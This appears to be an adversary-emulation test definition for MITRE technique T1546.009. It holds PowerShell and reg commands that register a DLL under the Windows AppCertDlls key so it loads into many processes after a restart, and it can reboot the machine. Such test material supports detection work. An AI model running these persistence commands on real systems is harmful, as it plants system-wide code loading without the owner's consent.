api_version: "2.0"
name: Create registry persistence via AppCert DLL
description: "Creates a new 'AtomicTest' value pointing to an AppCert DLL in the AppCertDlls registry key. \nOnce the computer restarted, the DLL will be loaded in multiple processes and write an \n'AtomicTest.txt' file in C:\\Users\\Public\\ to validate that the DLL executed succesfully.\n\nReference: https://skanthak.homepage.t-online.de/appcert.html\n"
args:
    - name: dll_path
      type: path
      default: PathToAtomicsFolder\T1546.009\bin\AtomicTest.dll
    - name: reboot
      type: string
      default: $false
uuid: a5ad6104-5bab-4c43-b295-b4c44c7c6b05
mitre:
    tactics:
        - 'TA0004: Privilege Escalation'
        - 'TA0003: Persistence'
    techniques:
        - 'T1546: Event Triggered Execution'
    subtechniques:
        - 'T1546.009: AppCert DLLs'
requirements:
    platforms:
        - os: windows
steps:
    - name: create-registry-persistence-via-appcert-dll
      inline: "Copy-Item \"{{.Args.dll_path}}\" C:\\Users\\Public\\AtomicTest.dll -Force\nreg add \"HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager\\AppCertDlls\" /v \"AtomicTest\" /t REG_EXPAND_SZ /d \"C:\\Users\\Public\\AtomicTest.dll\" /f\nif({{.Args.reboot}}){Restart-Computer} \n"
      executor: powershell
      cleanup:
        inline: |
            reg delete "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\AppCertDlls" /v "AtomicTest" /f
            Remove-Item C:\Users\Public\AtomicTest.dll -Force
            Remove-Item C:\Users\Public\AtomicTest.txt -Force
        executor: powershell
